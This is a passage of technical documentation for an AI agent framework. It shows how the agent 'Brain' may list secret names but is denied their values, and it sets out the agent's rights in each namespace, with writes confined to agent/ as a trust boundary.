→ {"secrets": ["MY_API_KEY", "STRIPE_KEY"]}

// Blocked: reading values
mcp.call("secret.get", {name: "MY_API_KEY"})
→ {"error": {"type": "access-denied"}}
```

To use secrets, the Brain invokes a Catalyst that has the secret granted.

### Namespace Access

| Namespace | Brain Access | Purpose |
|-----------|--------------|---------|
| `agent/` | **Read + Write + Run** | Brain-generated components |
| `local/` | Read + Run only | Human dev components |
| `cyfr/` (registry) | Search + Pull + Run | Published components |

> **Trust Boundary**: The Brain can only write to `agent/`. This isolates agent-generated code from human-developed and registry-pulled components.

